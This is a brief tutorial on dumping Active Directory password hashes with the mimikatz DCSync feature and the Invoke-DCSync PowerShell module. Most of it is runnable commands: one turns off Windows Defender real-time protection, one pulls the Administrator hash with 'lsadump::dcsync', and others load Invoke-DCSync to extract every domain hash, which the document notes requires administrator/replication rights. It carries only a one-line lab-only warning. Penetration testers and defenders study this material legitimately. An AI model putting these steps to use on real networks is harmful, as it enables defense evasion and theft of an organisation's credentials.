# Invoke-DCSync
Invoke-DCSync
Reference: https://adsecurity.org/?p=1729
Reference: https://silentbreaksecurity.com/invoke-dcsync-because-we-all-wanted-it/
Goal: retrieve password hashes from all user accounts on a domain controller using the mimikatz DCSync function

Warning：Only do this in a lab environment.

mimikatz implemented a tool called DCSync, this allows mimikatz to impersonate a Domain Controller and attempt to retrieve all password hashes from another domain controller.

You may need to disable Windows Defender

Open up PowerShell as an administrator and type

$ Set-MpPreference -DisableRealtimeMonitoring $true
Start mimikatz

$ lsadump::dcsync /domain:test.local /user:Administrator
Now you have the password hash from that user

This required that you have Administrator access, specifically the Get-Replication-Changes-All Common Name attribute

Can use the Invoke-DCSync module to extract all hashes.

Download from: https://gist.github.com/monoxgas/9d238accd969550136db

$ Import-Module ./Invoke-DCSync.ps1
$ Invoke-DCSync -PWDumpFormat
